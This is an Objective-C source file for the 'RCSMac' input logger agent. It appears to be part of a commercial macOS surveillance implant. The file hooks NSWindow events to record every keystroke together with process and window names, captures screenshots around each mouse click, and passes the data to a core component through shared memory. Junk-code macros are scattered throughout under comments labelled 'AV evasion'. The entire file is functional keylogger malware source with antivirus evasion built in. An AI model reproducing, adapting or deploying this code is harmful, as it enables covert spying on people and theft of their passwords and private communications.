/*
 * RCSMac - Input Logger Agent (Mouse and Keyboard)
 * 
 * Created by Alfredo 'revenge' Pesoli on 12/05/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <objc/objc-class.h>

#import "RCSMAgentInputLogger.h"
#import "RCSMInputManager.h"
#import "RCSMCommon.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

#import "RCSMAVGarbage.h"

static int contextHasBeenSwitched = 0;
static NSMutableString *keyBuffer = nil;

int mouseAgentIsActive     = 0;
int keylogAgentIsActive    = 0;

static int width   = 30;
static int height  = 30;

@implementation NSWindow (inputLoggerHook)

// Lookup the next implementation of the given selector after the
// default one. Returns nil if no alternate implementation is found.

- (void)logKeyboard: (NSEvent *)event
{
  NSString *_windowName;
  NSMutableData *logData;
  NSMutableData *processName;
  NSMutableData *windowName;
  NSMutableData *contentData;

  // AV evasion: only on release build
  AV_GARBAGE_007
  
  NSString *charCode;

  switch ([event keyCode])
    {
    case 0x24: // Enter
      {
        // AV evasion: only on release build
        AV_GARBAGE_001
        
        charCode = @"\u21B5\r\n";
        break;
      }
    case 0x33: // Backspace
      {
        // AV evasion: only on release build
        AV_GARBAGE_002
        
        charCode = @"\u2408";
        break;
      }
    case 0x35: // Escape
      {
        // AV evasion: only on release build
        AV_GARBAGE_007
        
        charCode = @"\u241B";
        break;
      }
    case 0x7b: // UP arrow
      {
        // AV evasion: only on release build
        AV_GARBAGE_004
        
        charCode = @"\u2190";
        break;
      }
    case 0x7c: // RIGHT arrow
      {
        // AV evasion: only on release build
        AV_GARBAGE_003
        
        charCode = @"\u2192";
        break;
      }
    case 0x7d: // DOWN arrow
      {
        // AV evasion: only on release build
        AV_GARBAGE_007
        
        charCode = @"\u2193";
        break;
      }
    case 0x7e: // LEFT arrow
      {
        // AV evasion: only on release build
        AV_GARBAGE_002
        
        charCode = @"\u2191";
        break;
      }
    default:
      {
        // AV evasion: only on release build
        AV_GARBAGE_001
        
        charCode = [event characters];
        break;
      }
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  if ([keyBuffer length] < KEY_MAX_BUFFER_SIZE)
    {
      // AV evasion: only on release build
      AV_GARBAGE_003
    
      [keyBuffer appendString: charCode];
    }
  else
    {     
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      logData   = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
      NSMutableData *entryData = [[NSMutableData alloc] init];
      
      // AV evasion: only on release build
      AV_GARBAGE_007
      
      shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
      short unicodeNullTerminator = 0x0000;
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      if (contextHasBeenSwitched == 1)
        {
          // AV evasion: only on release build
          AV_GARBAGE_001
        
          contextHasBeenSwitched = 0;

          NSProcessInfo *processInfo  = [NSProcessInfo processInfo];
          
          // AV evasion: only on release build
          AV_GARBAGE_008
          
          NSString *_processName      = [[processInfo processName] copy];
          
          // AV evasion: only on release build
          AV_GARBAGE_003
          
          time_t rawtime;
          struct tm *tmTemp;

          processName  = [[NSMutableData alloc] initWithData:
                             [_processName dataUsingEncoding:
                             NSUTF16LittleEndianStringEncoding]];
          
          // AV evasion: only on release build
          AV_GARBAGE_008
          
          // Dummy word
          short dummyWord = 0x0000;
          [entryData appendBytes: &dummyWord
                          length: sizeof(short)];
          
          // AV evasion: only on release build
          AV_GARBAGE_002
          
          // Struct tm
          time (&rawtime);
          tmTemp = gmtime(&rawtime);
          
          // AV evasion: only on release build
          AV_GARBAGE_007
          
          tmTemp->tm_year += 1900;
          tmTemp->tm_mon  ++;

          //
          // Our struct is 0x8 bytes bigger than the one declared on win32
          // this is just a quick fix
          //
          if (sizeof(long) == 4) // 32bit
            {
              [entryData appendBytes: (const void *)tmTemp
                              length: sizeof (struct tm) - 0x8];
            }
          else if (sizeof(long) == 8) // 64bit
            {
              [entryData appendBytes: (const void *)tmTemp
                              length: sizeof (struct tm) - 0x14];
            }
          
          // AV evasion: only on release build
          AV_GARBAGE_001
          
          // Process Name
          [entryData appendData: processName];
          // Null terminator
          [entryData appendBytes: &unicodeNullTerminator
                          length: sizeof(short)];

          _windowName = [[self title] copy];
          
          // AV evasion: only on release build
          AV_GARBAGE_007
          
          windowName = [[NSMutableData alloc] initWithData:
                            [_windowName dataUsingEncoding:
                            NSUTF16LittleEndianStringEncoding]];
          
          // AV evasion: only on release build
          AV_GARBAGE_003
          
          // Window Name
          [entryData appendData: windowName];
          // Null terminator
          [entryData appendBytes: &unicodeNullTerminator
                          length: sizeof(short)];
          
          // AV evasion: only on release build
          AV_GARBAGE_005
          
          // Delimiter
          uint32_t del = LOG_DELIMITER;
          [entryData appendBytes: &del
                          length: sizeof(del)];
          
          // AV evasion: only on release build
          AV_GARBAGE_008
          
          [_windowName release];
          [processName release];
          [_processName release];
          [windowName release];
        }
      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      contentData = [[NSMutableData alloc] initWithData:
                           [keyBuffer dataUsingEncoding:
                           NSUTF16LittleEndianStringEncoding]];
      
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      // Log buffer
      [entryData appendData: contentData];
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      shMemoryHeader->status          = SHMEM_WRITTEN;
      shMemoryHeader->agentID         = AGENT_KEYLOG;
      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      shMemoryHeader->direction       = D_TO_CORE;
      
      // AV evasion: only on release build
      AV_GARBAGE_005
      
      shMemoryHeader->commandType     = CM_LOG_DATA;
      shMemoryHeader->commandDataSize = [entryData length];
      
      // AV evasion: only on release build
      AV_GARBAGE_008
      
      memcpy(shMemoryHeader->commandData,
             [entryData bytes],
             [entryData length]);
      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      if ([mSharedMemoryLogging writeMemory: logData 
                                     offset: 0
                              fromComponent: COMP_AGENT] == TRUE)
        {
#ifdef DEBUG_KEYB
          infoLog(@"Keys logged correctly");
#endif
        }
      else
        {
#ifdef DEBUG_KEYB
          errorLog(@"Error while logging keystrokes (%@) to shared memory", keyBuffer);
#endif
        }
      
      // AV evasion: only on release build
      AV_GARBAGE_007
      
      [keyBuffer release];
      [logData release];
      [entryData release];
      [contentData release];
      
      // AV evasion: only on release build
      AV_GARBAGE_007
      
      keyBuffer = [[NSMutableString alloc] init];
      [keyBuffer appendString: charCode];
    }
}

- (void)logMouse
{
  NSString *_windowName;
  NSMutableData *processName;
  NSMutableData *windowName;
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  //
  // Read configuration
  //
  NSMutableData *readData = [mSharedMemoryLogging readMemoryFromComponent: COMP_AGENT
                                                                 forAgent: AGENT_MOUSE
                                                          withCommandType: CM_AGENT_CONF];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  if (readData != nil)
  {
    // AV evasion: only on release build
    AV_GARBAGE_005
    
    shMemoryLog *shMemLog = (shMemoryLog *)[readData bytes];
    
    // AV evasion: only on release build
    AV_GARBAGE_007
    
    NSMutableData *confData = [NSMutableData dataWithBytes: shMemLog->commandData
                                                    length: shMemLog->commandDataSize];
    
    // AV evasion: only on release build
    AV_GARBAGE_006
    
    mouseStruct *mouseConfiguration = (mouseStruct *)[confData bytes];
    
    // AV evasion: only on release build
    AV_GARBAGE_009
    
    width  = mouseConfiguration->width;
    height = mouseConfiguration->height;
  }
  else
  {
#ifdef DEBUG_MOUSE
    verboseLog(@"No configuration found for agent mouse");
#endif
  }
  
#ifdef DEBUG_MOUSE
  infoLog(@"height: %d", height);
  infoLog(@"width: %d", width);
#endif
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  NSPoint eventLocation = [NSEvent mouseLocation];
  eventLocation.y = 800 - eventLocation.y;
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  CGImageRef screenShot;
  NSBitmapImageRep *bitmapRep;
  CGSize mouseRectSize = { .width = width, .height = height };
  CGRect mouseRect  = {
    .origin = { .x = eventLocation.x - mouseRectSize.width * 0.5, .y = eventLocation.y - mouseRectSize.height * 0.5 },
    .size   = mouseRectSize,
  };
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  screenShot = CGWindowListCreateImage(mouseRect,
                                       kCGWindowListOptionOnScreenOnly,
                                       kCGNullWindowID,
                                       kCGWindowImageDefault);
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  if (screenShot == NULL)
  {
    // AV evasion: only on release build
    AV_GARBAGE_007
    
    return;
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  bitmapRep = [[NSBitmapImageRep alloc] initWithCGImage: screenShot];
  NSData *imageData = [bitmapRep representationUsingType: NSJPEGFileType
                                              properties: nil];
  
  //
  // Logging
  //
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  NSMutableData *entryData = [[NSMutableData alloc] initWithLength: sizeof(mouseAdditionalStruct)];
  NSProcessInfo *processInfo  = [NSProcessInfo processInfo];
  NSString *_processName      = [[processInfo processName] copy];
  
  processName  = [[NSMutableData alloc] initWithData:
                  [_processName dataUsingEncoding:
                   NSUTF16LittleEndianStringEncoding]];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  _windowName = [[self title] copy];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  windowName = [[NSMutableData alloc] initWithData:
                [_windowName dataUsingEncoding:
                 NSUTF16LittleEndianStringEncoding]];
  
  // Dummy word
  short dummyWord = 0x0000;
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  mouseAdditionalStruct *mouseAdditionalHeader = (mouseAdditionalStruct *)[entryData bytes];
  mouseAdditionalHeader->version           = LOG_MOUSE_VERSION;
  mouseAdditionalHeader->processNameLength = [processName length] + sizeof(dummyWord);
  mouseAdditionalHeader->windowNameLength  = [windowName length] + sizeof(dummyWord);
  mouseAdditionalHeader->x = eventLocation.x - mouseRectSize.width * 0.5;
  mouseAdditionalHeader->y = eventLocation.y - mouseRectSize.height * 0.5;
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  NSRect screenRes = [[NSScreen mainScreen] frame];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  mouseAdditionalHeader->xMax = screenRes.origin.x;
  mouseAdditionalHeader->yMax = screenRes.origin.y;
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  // Process Name
  [entryData appendData: processName];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  // Null terminator
  [entryData appendBytes: &dummyWord
                  length: sizeof(short)];
  
  // Window Name
  [entryData appendData: windowName];
  // Null terminator
  [entryData appendBytes: &dummyWord
                  length: sizeof(short)];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  // Now append the image
  [entryData appendData: imageData];
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  int leftBytesLength = 0;
  int byteIndex = 0;
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  if ([entryData length] > MAX_COMMAND_DATA_SIZE)
  {
    do
    {
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      NSMutableData *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
      
      // AV evasion: only on release build
      AV_GARBAGE_007
      
      shMemoryHeader->status          = SHMEM_WRITTEN;
      shMemoryHeader->agentID         = AGENT_MOUSE;
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      shMemoryHeader->direction       = D_TO_CORE;
      shMemoryHeader->commandType     = CM_LOG_DATA;
      shMemoryHeader->flag            = 0;
      shMemoryHeader->commandDataSize = [entryData length];
      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      leftBytesLength = (([entryData length] - byteIndex >= 0x300)
                         ? 0x300
                         : ([entryData length] - byteIndex));
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      memcpy(shMemoryHeader->commandData,
             [entryData bytes] + byteIndex,
             leftBytesLength);
      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      if ([mSharedMemoryLogging writeMemory: logData
                                     offset: 0
                              fromComponent: COMP_AGENT] == TRUE)
      {
#ifdef DEBUG_MOUSE
        verboseLog(@"Mouse click sent through Shared Memory");
#endif
      }
      else
      {
#ifdef DEBUG_MOUSE
        errorLog(@"Error while logging mouse to shared memory");
#endif
      }
      
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      byteIndex += leftBytesLength;
      [logData release];
      
    } while (byteIndex < [entryData length]);
  }
  else
  {
    // AV evasion: only on release build
    AV_GARBAGE_007
    
    NSMutableData *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
    
    // AV evasion: only on release build
    AV_GARBAGE_009
    
    shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
    
    shMemoryHeader->status          = SHMEM_WRITTEN;
    shMemoryHeader->agentID         = AGENT_MOUSE;
    shMemoryHeader->direction       = D_TO_CORE;
    
    // AV evasion: only on release build
    AV_GARBAGE_003
    
    shMemoryHeader->commandType     = CM_LOG_DATA;
    shMemoryHeader->flag            = 0;
    shMemoryHeader->commandDataSize = [entryData length];
    
    // AV evasion: only on release build
    AV_GARBAGE_008
    
    memcpy(shMemoryHeader->commandData,
           [entryData bytes],
           [entryData length]);
    
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    if ([mSharedMemoryLogging writeMemory: logData
                                   offset: 0
                            fromComponent: COMP_AGENT] == TRUE)
    {
#ifdef DEBUG
      infoLog(@"Mouse click sent through Shared Memory");
#endif
    }
    else
    {
#ifdef DEBUG
      errorLog(@"Error while logging mouse to shared memory");
#endif
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_005
    
    [logData release];
  }
  
  [entryData release];
  [windowName release];
  [_windowName release];
  [processName release];
  [_processName release];
  [bitmapRep release];
  CGImageRelease(screenShot);
}

- (void)hookKeyboardAndMouse: (NSEvent *)event
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  if (keyBuffer == nil && keylogAgentIsActive == 1)
    {
      keyBuffer = [[NSMutableString alloc] init];
      contextHasBeenSwitched = 1;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  switch ([event type])
    {
    case NSLeftMouseDown:
      {
        if (mouseAgentIsActive == 1)
          {
            // AV evasion: only on release build
            AV_GARBAGE_004
          
            [self logMouse];
          }
        
        break;
      }
    case NSKeyDown:
      {
        if (keylogAgentIsActive == 1)
          {
            // AV evasion: only on release build
            AV_GARBAGE_003
          
            [self logKeyboard: event];
          }
                
        break;
      }
    default:
      break;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  [outerPool release];
  [self hookKeyboardAndMouse: event];
}

- (void)resignKeyWindowHook
{
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  contextHasBeenSwitched = 0;
  [self resignKeyWindowHook];
}

- (void)becomeKeyWindowHook
{
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  contextHasBeenSwitched = 1;
  [self becomeKeyWindowHook];
}

- (IMP)getImplementationOf: (SEL)lookup after: (IMP)skip
{
  BOOL found = NO;
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  Class currentClass = object_getClass(self);
  while (currentClass)
  {
    // Get the list of methods for this class
    unsigned int methodCount;
    Method *methodList = class_copyMethodList(currentClass, &methodCount);
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    // Iterate over all methods
    unsigned int i;
    for (i = 0; i < methodCount; i++)
    {
      // Look for the selector
      if (method_getName(methodList[i]) != lookup)
      {
        continue;
      }
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      IMP implementation = method_getImplementation(methodList[i]);
      
      // Check if this is the "skip" implementation
      if (implementation == skip)
      {
        found = YES;
      }
      else if (found)
      {
        // Return the match.
        free(methodList);
        return implementation;
      }
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_004
    
    // No match found. Traverse up through super class' methods.
    free(methodList);
    
    // AV evasion: only on release build
    AV_GARBAGE_005
    
    currentClass = class_getSuperclass(currentClass);
  }
  return nil;
}

@end
